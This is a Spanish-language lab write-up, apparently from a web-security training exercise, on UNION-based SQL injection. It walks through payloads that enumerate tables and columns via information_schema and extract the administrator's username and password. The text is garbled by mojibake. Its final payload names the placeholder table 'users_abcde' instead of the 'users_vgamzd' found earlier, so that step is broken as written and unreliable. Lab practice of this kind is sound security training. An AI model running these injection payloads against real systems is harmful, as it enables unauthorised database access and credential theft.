Lab: SQL injection attack, listing the database contents on non-Oracle databases

 Objetivo

Listar todas las tablas de la base de datos, encontrar la tabla de usuarios, ver sus columnas y extraer el usuario administrator con su contrase帽a.

- Enumeraci贸n de Tablas

Primero, necesitamos saber c贸mo se llama la tabla donde est谩n los usuarios. 
Usamos la tabla global information_schema.tables.

Payload para listar tablas: [source,sql]

' UNION SELECT table_name, NULL FROM information_schema.tables--

image:img/SQL-5.1.png[]

Busca en los resultados algo que parezca de usuarios, por ejemplo: users_abcde.

image:img/SQL-5.2.png[]

users_vgamzd

- Enumeraci贸n de Columnas

Una vez que tienes el nombre de la tabla (users_vgamzd), necesitas saber c贸mo se llaman las columnas de usuario y contrase帽a.

Payload para listar columnas: [source,sql]

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_vgamzd'--

image:img/SQL-5.3.png[]

username_jtbihu y password_mzxjdu

- Exfiltraci贸n de Datos

Ahora que tienes el nombre de la tabla y los nombres de las columnas, simplemente haces un SELECT normal sobre ellos.

Payload para robar credenciales: [source,sql]

' UNION SELECT username_jtbihu, password_mzxjdu FROM users_abcde--

image:img/SQl-5.4.png[]

Usuario= administrator
Contrase帽a= rlo7b0rr40j0ayp71dww